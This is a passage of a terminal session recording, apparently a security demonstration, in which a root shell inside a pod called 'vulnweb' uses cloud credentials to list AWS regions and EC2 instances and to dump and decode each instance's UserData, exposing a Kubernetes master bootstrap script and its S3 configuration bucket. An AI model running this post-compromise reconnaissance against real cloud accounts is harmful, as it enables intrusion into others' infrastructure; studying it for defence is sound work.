+      ": \"10.0.0.209\", \r\n                                    \"Primary\": true, \r\n                                    \"Association\": {\r\n                                        \"PublicIp\": \"54.162.190.38\", \r\n                                        \"PublicDnsName\": \"ec2-54-162-190-38.compute-1.amazonaws.com\", \r\n                                        \"IpOwnerId\": \"amazon\"\r\n                                    }\r\n                                }\r\n                            ], \r\n                            \"PrivateDnsName\": \"ip-10-0-0-209.ec2.internal\", \r\n                            \"Attachment\": {\r\n                                \"Status\": \"attached\", \r\n                                \"DeviceIndex\": 0, \r\n                                \"DeleteOnTermination\": true, \r\n                                \"AttachmentId\": \"eni-attach-0688f5f5\", \r\n                                \"AttachTime\": \"2017-10-06T14:02:30.000Z\"\r\n                            }, \r\n                            \"Groups\": [\r\n                                {\r\n  "
+    ],
+    [
+      6.2e-05,
+      "                                  \"GroupName\": \"launch-wizard-1\", \r\n                                    \"GroupId\": \"sg-2949545a\"\r\n                                }\r\n                            ], \r\n                            \"Ipv6Addresses\": [], \r\n                            \"OwnerId\": \"776845191872\", \r\n                            \"PrivateIpAddress\": \"10.0.0.209\", \r\n                            \"SubnetId\": \"subnet-9150b2d8\", \r\n                            \"Association\": {\r\n                                \"PublicIp\": \"54.162.190.38\", \r\n                                \"PublicDnsName\": \"ec2-54-162-190-38.compute-1.amazonaws.com\", \r\n                                \"IpOwnerId\": \"amazon\"\r\n                            }\r\n                        }\r\n"
+    ],
+    [
+      0.000413,
+      "                    ], \r\n                    \"SourceDestCheck\": true, \r\n                    \"Placement\": {\r\n                        \"Tenancy\": \"default\", \r\n                        \"GroupName\": \"\", \r\n                        \"AvailabilityZone\": \"us-east-1a\"\r\n                    }, \r\n                    \"Hypervisor\": \"xen\", \r\n                    \"BlockDeviceMappings\": [\r\n                        {\r\n                            \"DeviceName\": \"/dev/sda1\", \r\n                            \"Ebs\": {\r\n                                \"Status\": \"attached\", \r\n                                \"DeleteOnTermination\": true, \r\n                                \"VolumeId\": \"vol-08ab317773a8518c5\", \r\n                                \"AttachTime\": \"2017-10-06T14:02:33.000Z\"\r\n                            }\r\n                        }\r\n                    ], \r\n                    \"Architecture\": \"x86_64\", \r\n                    \"RootDeviceType\": \"ebs\", \r\n                    \"RootDeviceName\": \"/dev/sda1\", \r\n                    \"VirtualizationT"
+    ],
+    [
+      0.000139,
+      "ype\": \"hvm\", \r\n                    \"Tags\": [\r\n                        {\r\n                            \"Value\": \"dccker.io\", \r\n                            \"Key\": \"Registry\"\r\n                        }, \r\n                        {\r\n                            \"Value\": \"dccker.io\", \r\n                            \"Key\": \"Name\"\r\n                        }\r\n                    ], \r\n                    \"AmiLaunchIndex\": 1\r\n                }\r\n            ], \r\n            \"ReservationId\": \"r-020f9c68af209a127\", \r\n            \"Groups\": [], \r\n            \"OwnerId\": \"776845191872\"\r\n        }\r\n    ]\r\n}\r\n"
+    ],
+    [
+      0.039936,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "aws ec2 describe-regions --region"
+    ],
+    [
+      9.5e-05,
+      " us-east-1 --qu"
+    ],
+    [
+      0.00038,
+      "ery 'Re"
+    ],
+    [
+      0.000162,
+      "gi \rons[].RegionName'"
+    ],
+    [
+      0.000179,
+      " | jq '.[]' | awk"
+    ],
+    [
+      0.000374,
+      " -F'\"' '{print "
+    ],
+    [
+      0.000128,
+      "$2}' "
+    ],
+    [
+      0.000104,
+      "> regio"
+    ],
+    [
+      0.000291,
+      "ns"
+    ],
+    [
+      1.751088,
+      "\r\n"
+    ],
+    [
+      0.453187,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      0.928141,
+      "c"
+    ],
+    [
+      0.101433,
+      "l"
+    ],
+    [
+      0.078692,
+      "e"
+    ],
+    [
+      0.056998,
+      "a"
+    ],
+    [
+      0.067251,
+      "r"
+    ],
+    [
+      0.076704,
+      "\r\n"
+    ],
+    [
+      0.000811,
+      "\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      0.327347,
+      "v"
+    ],
+    [
+      0.101035,
+      "i"
+    ],
+    [
+      0.113733,
+      " "
+    ],
+    [
+      0.090662,
+      "r"
+    ],
+    [
+      0.111302,
+      "e"
+    ],
+    [
+      0.189472,
+      "gions "
+    ],
+    [
+      0.151965,
+      "\r\n\u001b[?1049h\u001b[?1h\u001b=\u001b[2;1H▽\u001b[6n\u001b[2;1H  \u001b[1;1H"
+    ],
+    [
+      0.001585,
+      "\u001b[1;25r\u001b[?12;25h\u001b[?12l\u001b[?25h\u001b[27m\u001b[23m\u001b[m\u001b[H\u001b[2J\u001b[?25l\u001b[25;1H\"regions\" 14L, 167C\u001b[>c"
+    ],
+    [
+      0.000264,
+      "\u001b[1;1Hap-south-1\r\neu-west-2\r\neu-west-1\r\nap-northeast-2\r\nap-northeast-1\r\nsa-east-1\r\nca-central-1\r\nap-southeast-1\r\nap-southeast-2\r\neu-central-1\r\nus-east-1\r\nus-east-2\r\nus-west-1\r\nus-west-2\r\n\u001b[1m\u001b[34m~                                                                                         \u001b[16;1H~                                                                                         \u001b[17;1H~                                                                                         \u001b[18;1H~                                                                                         \u001b[19;1H~                                                                                         \u001b[20;1H~                                                                                         \u001b[21;1H~                                                                                         \u001b[22;1H~                                                                                         \u001b[23;1H~                                                   "
+    ],
+    [
+      7e-05,
+      "                                      \u001b[24;1H~                                                                                         \u001b[m\u001b[25;73H1,1\u001b[11CAll\u001b[1;1H\u001b[?12l\u001b[?25h"
+    ],
+    [
+      1.489532,
+      "\u0007"
+    ],
+    [
+      0.339431,
+      "\u0007\u001b[?25l\u001b[25;1H\u001b[K\u001b[25;1H:\u001b[?12l\u001b[?25h"
+    ],
+    [
+      0.146501,
+      "q\u001b[?25l\u001b[?12l\u001b[?25h"
+    ],
+    [
+      0.212806,
+      "!\u001b[?25l\u001b[?12l\u001b[?25h"
+    ],
+    [
+      0.066047,
+      "\r\u001b[?25l\u001b[25;1H\u001b[K\u001b[25;1H\u001b[?1l\u001b>\u001b[?12l\u001b[?25h\u001b[?1049l"
+    ],
+    [
+      9.5e-05,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "for i in $(ca"
+    ],
+    [
+      0.000325,
+      "t regions); do\r\n"
+    ],
+    [
+      0.000207,
+      ">   aws ec2 --region ${i} describe-inst"
+    ],
+    [
+      0.000142,
+      "ances | jq -r ' .R"
+    ],
+    [
+      0.00021,
+      "eservations[]"
+    ],
+    [
+      0.000277,
+      ".Instances[]"
+    ],
+    [
+      0.000257,
+      " | [ .Vp \rcId, .Ins"
+    ],
+    [
+      0.000258,
+      "tanceId, .Placement"
+    ],
+    [
+      0.000271,
+      ".AvailabilityZone, .PublicDns"
+    ],
+    [
+      0.000466,
+      "Name, .Secur"
+    ],
+    [
+      0.000159,
+      "ityGroups["
+    ],
+    [
+      0.000299,
+      "].GroupName \r"
+    ],
+    [
+      0.000104,
+      ", .PublicIpAddr"
+    ],
+    [
+      0.000481,
+      "ess, .PrivateIpA"
+    ],
+    [
+      0.009252,
+      "ddress, .InstanceType] | @csv' | tee -a instances.csv\r\n> done"
+    ],
+    [
+      1.016016,
+      "\r\n"
+    ],
+    [
+      2.0,
+      "\"vpc-e28f2a9a\",\"i-01fb6d4dda05da364\",\"us-east-1d\",\"ec2-54-175-73-175.compute-1.amazonaws.com\",\"nodes.kube.lonimbus.com\",\"54.175.73.175\",\"172.20.42.228\",\"t2.medium\"\r\n\"vpc-e28f2a9a\",\"i-07e49bdf8370695dc\",\"us-east-1d\",\"ec2-54-234-59-44.compute-1.amazonaws.com\",\"nodes.kube.lonimbus.com\",\"54.234.59.44\",\"172.20.48.188\",\"t2.medium\"\r\n\"vpc-e28f2a9a\",\"i-09c9c706043a20f04\",\"us-east-1d\",\"ec2-52-91-151-221.compute-1.amazonaws.com\",\"masters.kube.lonimbus.com\",\"52.91.151.221\",\"172.20.57.249\",\"m3.medium\"\r\n\"vpc-ac0f90cb\",\"i-07087c9d36d4f9131\",\"us-east-1a\",\"ec2-34-207-143-119.compute-1.amazonaws.com\",\"launch-wizard-1\",\"34.207.143.119\",\"10.0.0.254\",\"t2.micro\"\r\n\"vpc-ac0f90cb\",\"i-06fb0ccbd225868b4\",\"us-east-1a\",\"ec2-54-162-190-38.compute-1.amazonaws.com\",\"launch-wizard-1\",\"54.162.190.38\",\"10.0.0.209\",\"t2.micro\"\r\n"
+    ],
+    [
+      2.0,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      0.847809,
+      "\r\nroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      0.439557,
+      "c"
+    ],
+    [
+      0.111471,
+      "l"
+    ],
+    [
+      0.113973,
+      "e"
+    ],
+    [
+      0.067404,
+      "a"
+    ],
+    [
+      0.336541,
+      "r"
+    ],
+    [
+      0.191762,
+      "\r\n"
+    ],
+    [
+      0.000416,
+      "\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      0.281262,
+      "v"
+    ],
+    [
+      0.089465,
+      "i"
+    ],
+    [
+      0.101638,
+      " "
+    ],
+    [
+      0.099648,
+      "i"
+    ],
+    [
+      0.091395,
+      "n"
+    ],
+    [
+      0.044757,
+      "stances.csv "
+    ],
+    [
+      0.271963,
+      "\r\n"
+    ],
+    [
+      0.000774,
+      "\u001b[?1049h\u001b[?1h\u001b=\u001b[2;1H▽\u001b[6n\u001b[2;1H  \u001b[1;1H\u001b[1;25r\u001b[?12;25h\u001b[?12l\u001b[?25h\u001b[27m\u001b[23m\u001b[m\u001b[H\u001b[2J\u001b[?25l\u001b[25;1H\"instances.csv\" 5L, 798C\u001b[>c"
+    ],
+    [
+      0.000651,
+      "\u001b[1;1H\"vpc-e28f2a9a\",\"i-01fb6d4dda05da364\",\"us-east-1d\",\"ec2-54-175-73-175.compute-1.amazonaws.cc\u001b[2;1Hom\",\"nodes.kube.lonimbus.com\",\"54.175.73.175\",\"172.20.42.228\",\"t2.medium\"\r\n\"vpc-e28f2a9a\",\"i-07e49bdf8370695dc\",\"us-east-1d\",\"ec2-54-234-59-44.compute-1.amazonaws.coo\u001b[4;1Hm\",\"nodes.kube.lonimbus.com\",\"54.234.59.44\",\"172.20.48.188\",\"t2.medium\"\r\n\"vpc-e28f2a9a\",\"i-09c9c706043a20f04\",\"us-east-1d\",\"ec2-52-91-151-221.compute-1.amazonaws.cc\u001b[6;1Hom\",\"masters.kube.lonimbus.com\",\"52.91.151.221\",\"172.20.57.249\",\"m3.medium\"\r\n\"vpc-ac0f90cb\",\"i-07087c9d36d4f9131\",\"us-east-1a\",\"ec2-34-207-143-119.compute-1.amazonaws..\u001b[8;1Hcom\",\"launch-wizard-1\",\"34.207.143.119\",\"10.0.0.254\",\"t2.micro\"\r\n\"vpc-ac0f90cb\",\"i-06fb0ccbd225868b4\",\"us-east-1a\",\"ec2-54-162-190-38.compute-1.amazonaws.cc\u001b[10;1Hom\",\"launch-wizard-1\",\"54.162.190.38\",\"10.0.0.209\",\"t2.micro\"\r\n\u001b[1m\u001b[34m~                                                                                         \u001b[12;1H~                                                                        "
+    ],
+    [
+      0.000481,
+      "                 \u001b[13;1H~                                                                                         \u001b[14;1H~                                                                                         \u001b[15;1H~                                                                                         \u001b[16;1H~                                                                                         \u001b[17;1H~                                                                                         \u001b[18;1H~                                                                                         \u001b[19;1H~                                                                                         \u001b[20;1H~                                                                                         \u001b[21;1H~                                                                                         \u001b[22;1H~                                                                                         \u001b[23;1H~                             "
+    ],
+    [
+      0.000133,
+      "                                                            \u001b[24;1H~                                                                                         \u001b[m\u001b[25;73H1,1\u001b[11CAll\u001b[1;1H\u001b[?12l\u001b[?25h"
+    ],
+    [
+      2.0,
+      "\u0007\u001b[?25l\u001b[25;1H\u001b[K\u001b[25;1H:\u001b[?12l\u001b[?25h"
+    ],
+    [
+      0.12432,
+      "q\u001b[?25l\u001b[?12l\u001b[?25h"
+    ],
+    [
+      0.203236,
+      "!\u001b[?25l\u001b[?12l\u001b[?25h"
+    ],
+    [
+      0.04491,
+      "\r\u001b[?25l\u001b[25;1H\u001b[K\u001b[25;1H\u001b[?1l\u001b>\u001b[?12l\u001b[?25h\u001b[?1049l"
+    ],
+    [
+      6.9e-05,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      0.530687,
+      "for r in $(cat regions);"
+    ],
+    [
+      0.000188,
+      " do\r\n>   for i in $(cat instances.csv |"
+    ],
+    [
+      0.000252,
+      " grep \"\\\"${r}"
+    ],
+    [
+      0.000175,
+      "\" | awk -F\\"
+    ],
+    [
+      0.000152,
+      "\" '{print "
+    ],
+    [
+      0.000342,
+      "$4}'); do\r\n"
+    ],
+    [
+      0.000385,
+      ">     aws ec2 --region ${r} describe-instance-attribute --inst"
+    ],
+    [
+      0.000332,
+      "ance-id ${i} --attr"
+    ],
+    [
+      0.000387,
+      "ibute use \rrData | "
+    ],
+    [
+      0.000462,
+      "jq '.UserData.Value' | tr -d \\\" | bas"
+    ],
+    [
+      0.000358,
+      "e64 -d > ${i}-use"
+    ],
+    [
+      0.00015,
+      "rdata"
+    ],
+    [
+      0.000108,
+      ".txt\r\n>   d"
+    ],
+    [
+      0.001994,
+      "one\r\n> done"
+    ],
+    [
+      2.0,
+      "\r\n"
+    ],
+    [
+      2.0,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "s"
+    ],
+    [
+      0.111659,
+      "k"
+    ],
+    [
+      0.34804,
+      "\b\u001b[K"
+    ],
+    [
+      0.145942,
+      "\b\u001b[K"
+    ],
+    [
+      0.541365,
+      "l"
+    ],
+    [
+      0.113387,
+      "s"
+    ],
+    [
+      0.022465,
+      " "
+    ],
+    [
+      0.223682,
+      "*"
+    ],
+    [
+      0.203683,
+      "."
+    ],
+    [
+      0.100066,
+      "t"
+    ],
+    [
+      0.179366,
+      "x"
+    ],
+    [
+      0.113248,
+      "t"
+    ],
+    [
+      0.102601,
+      "\r\n"
+    ],
+    [
+      0.000402,
+      "i-01fb6d4dda05da364-userdata.txt  i-07e49bdf8370695dc-userdata.txt\r\ni-06fb0ccbd225868b4-userdata.txt  i-09c9c706043a20f04-userdata.txt\r\ni-07087c9d36d4f9131-userdata.txt\r\nroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      1.521602,
+      "cat i-09c9c706043a20f04-userdata.txt"
+    ],
+    [
+      2.0,
+      "\r\n"
+    ],
+    [
+      0.000545,
+      "#!/bin/bash\r\n# Copyright 2016 The Kubernetes Authors All rights reserved.\r\n#\r\n# Licensed under the Apache License, Version 2.0 (the \"License\");\r\n# you may not use this file except in compliance with the License.\r\n# You may obtain a copy of the License at\r\n#\r\n#     http://www.apache.org/licenses/LICENSE-2.0\r\n#\r\n# Unless required by applicable law or agreed to in writing, software\r\n# distributed under the License is distributed on an \"AS IS\" BASIS,\r\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\r\n# See the License for the specific language governing permissions and\r\n# limitations under the License.\r\n\r\nset -o errexit\r\nset -o nounset\r\nset -o pipefail\r\n\r\nNODEUP_URL=https://kubeupv2.s3.amazonaws.com/kops/1.7.0/linux/amd64/nodeup\r\nNODEUP_HASH=\r\n\r\n\r\n\r\n\r\nfunction ensure-install-dir() {\r\n  INSTALL_DIR=\"/var/cache/kubernetes-install\"\r\n  # On ContainerOS, we install to /var/lib/toolbox install (because of noexec)\r\n  if [[ -d /var/lib/toolbox ]]; then\r\n    INSTALL_DIR=\"/var/lib/toolbox/kubernet"
+    ],
+    [
+      0.000116,
+      "es-install\"\r\n  fi\r\n  mkdir -p ${INSTALL_DIR}\r\n  cd ${INSTALL_DIR}\r\n}\r\n\r\n# Retry a download until we get it. Takes a hash and a set of URLs.\r\n#\r\n# $1 is the sha1 of the URL. Can be \"\" if the sha1 is unknown.\r\n# $2+ are the URLs to download.\r\ndownload-or-bust() {\r\n  local -r hash=\"$1\"\r\n  shift 1\r\n\r\n  urls=( $* )\r\n  while true; do\r\n    for url in \"${urls[@]}\"; do\r\n      local file=\"${url##*/}\"\r\n      rm -f \"${file}\"\r\n      if ! curl -f --ipv4 -Lo \"${file}\" --connect-timeout 20 --retry 6 --retry-delay 10 \"${url}\"; then\r\n        echo \"== Failed to download ${url}. Retrying. ==\"\r\n      elif [[ -n \"${hash}\" ]] && ! validate-hash \"${file}\" \"${hash}\"; then\r\n        echo \"== Hash validation of ${url} failed. Retrying. ==\"\r\n      else\r\n        if [[ -n \"${hash}\" ]]; then\r\n          echo \"== Downloaded ${url} (SHA1 = ${hash}) ==\"\r\n        else\r\n          echo \"== Downloaded ${url} ==\"\r\n        fi\r\n        return\r\n      fi\r\n    done\r\n\r\n    echo \"All downloads failed; sleeping before retrying\"\r\n    sleep 60\r\n  done\r\n}\r\n\r\nv"
+    ],
+    [
+      8e-05,
+      "alidate-hash() {\r\n  local -r file=\"$1\"\r\n  local -r expected=\"$2\"\r\n  local actual\r\n\r\n  actual=$(sha1sum ${file} | awk '{ print $1 }') || true\r\n  if [[ \"${actual}\" != \"${expected}\" ]]; then\r\n    echo \"== ${file} corrupted, sha1 ${actual} doesn't match expected ${expected} ==\"\r\n    return 1\r\n  fi\r\n}\r\n\r\nfunction split-commas() {\r\n  echo $1 | tr \",\" \"\\n\"\r\n}\r\n\r\nfunction try-download-release() {\r\n  # TODO(zmerlynn): Now we REALLY have no excuse not to do the reboot\r\n  # optimization.\r\n\r\n  local -r nodeup_urls=( $(split-commas \"${NODEUP_URL}\") )\r\n  local -r nodeup_filename=\"${nodeup_urls[0]##*/}\"\r\n  if [[ -n \"${NODEUP_HASH:-}\" ]]; then\r\n    local -r nodeup_hash=\"${NODEUP_HASH}\"\r\n  else\r\n  # TODO: Remove?\r\n    echo \"Downloading sha1 (not found in env)\"\r\n    download-or-bust \"\" \"${nodeup_urls[@]/%/.sha1}\"\r\n    local -r nodeup_hash=$(cat \"${nodeup_filename}.sha1\")\r\n  fi\r\n\r\n  echo \"Downloading nodeup (${nodeup_urls[@]})\"\r\n  download-or-bust \"${nodeup_hash}\" \"${nodeup_urls[@]}\"\r\n\r\n  chmod +x nodeup\r\n}\r\n\r\nfunction download"
+    ],
+    [
+      0.000311,
+      "-release() {\r\n  # In case of failure checking integrity of release, retry.\r\n  until try-download-release; do\r\n    sleep 15\r\n    echo \"Couldn't download release. Retrying...\"\r\n  done\r\n\r\n  echo \"Running nodeup\"\r\n  # We can't run in the foreground because of https://github.com/docker/docker/issues/23793\r\n  ( cd ${INSTALL_DIR}; ./nodeup --install-systemd-unit --conf=${INSTALL_DIR}/kube_env.yaml --v=8  )\r\n}\r\n\r\n####################################################################################\r\n\r\n/bin/systemd-machine-id-setup || echo \"failed to set up ensure machine-id configured\"\r\n\r\necho \"== nodeup node config starting ==\"\r\nensure-install-dir\r\n\r\ncat > kube_env.yaml << __EOF_KUBE_ENV\r\nAssets:\r\n- 7bf3fda43bb8d0a55622ca68dcbfaf3cc7f2dddc@https://storage.googleapis.com/kubernetes-release/release/v1.7.4/bin/linux/amd64/kubelet\r\n- 819010a7a028b165f5e6df37b1bb7713ff6d070f@https://storage.googleapis.com/kubernetes-release/release/v1.7.4/bin/linux/amd64/kubectl\r\n- 1d9788b0f5420e1a219aad2cb8681823fc515e7c@https://storage.g"
+    ],
+    [
+      0.000165,
+      "oogleapis.com/kubernetes-release/network-plugins/cni-0799f5732f2a11b329d9e3d51b9c8f2e3759f2ff.tar.gz\r\n- 5d95d64d7134f202ba60b1fa14adaff138905d15@https://kubeupv2.s3.amazonaws.com/kops/1.7.0/linux/amd64/utils.tar.gz\r\nClusterName: kube.lonimbus.com\r\nConfigBase: s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com\r\nInstanceGroupName: master-us-east-1d\r\nTags:\r\n- _automatic_upgrades\r\n- _aws\r\n- _kubernetes_master\r\n- _networking_cni\r\nchannels:\r\n- s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com/addons/bootstrap-channel.yaml\r\nprotokubeImage:\r\n  hash: 5bd97a02f0793d1906e9f446c548ececf1444737\r\n  name: protokube:1.7.0\r\n  source: https://kubeupv2.s3.amazonaws.com/kops/1.7.0/images/protokube.tar.gz\r\n\r\n__EOF_KUBE_ENV\r\n\r\ndownload-release\r\necho \"== nodeup node config done ==\"\r\nroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "exit\r\n"
+    ],
+    [
+      0.030552,
+      "\u001b]0;geese@mb: ~\u0007\u001b[0;32m~\u001b[0m$ "
+    ],
+    [
+      0.794569,
+      "kubectl exec -it vulnweb-2569941405-q8v9r /bin/bash"
+    ],
+    [
+      1.485414,
+      "\r\u001b[C\u001b[C\u001b[C\u001b[K"
+    ]
+  ]
+}
